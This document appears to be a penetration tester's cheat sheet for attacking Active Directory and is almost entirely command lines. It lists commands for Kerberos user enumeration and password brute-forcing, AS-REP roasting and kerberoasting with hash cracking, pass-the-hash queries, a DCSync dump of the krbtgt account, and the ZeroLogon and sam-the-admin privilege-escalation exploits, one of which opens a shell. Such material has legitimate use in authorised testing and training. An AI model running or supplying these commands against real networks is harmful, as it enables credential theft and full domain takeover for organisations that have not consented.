#### User enumeration

```
kerbrute -d domain.local --dc $IP userenum /usr/share/seclists/Usernames/Names/names.txt
```

#### User bruteforce password

```
kerbrute -d domain.local --dc $IP bruteuser /usr/share/seclists/Passwords/probable-v2-top12000.txt username
```

#### AS_REP Roasting

```
impacket-GetNPUsers domain.local/ -dc-ip $IP -usersfile users.txt -format hashcat -out asrep-roasting.txt
```
```
hashcat -m 18200 asrep-roasting.txt /usr/share/wordlists/rockyou.txt
```

#### Get AD Users

```
impacket-GetADUsers -hashes ':11628d378a956b8ffc7e2c54b9a59574' 'domain.com/user' -dc-ip 10.10.10.10 -all
```

#### Get users description

```
crackmapexec ldap $IP -u user -p 'Password1' --kdcHost $IP -M get-desc-users
```

#### Kerberoasting 

- Also work with machine account :)

```
impacket-GetUserSPNs -hashes ':11628d378a956b8ffc7e2c54b9a59574' 'domain.com/user' -dc-ip 10.10.10.10 -request -outputfile kerberoasting.hash
```

#### DC Sync

```
secretsdump.py 'contoso.local/Administrator@$IP' -just-dc-user krbtgt
```

#### ZeroLogon

- check CVE-2020-1472 : https://github.com/SecuraBV/CVE-2020-1472
- exploit CVE-2020-1472 : https://github.com/dirkjanm/CVE-2020-1472
```
python3 cve-2020-1472-exploit.py DCNAME $IP
```

#### SAM The Admin

exploit CVE-2021-42278 and CVE-2021-42287 : https://github.com/WazeHell/sam-the-admin
```
python3 sam_the_admin.py "domain.local\user:Password1!" -dc-ip $IP -shell
```
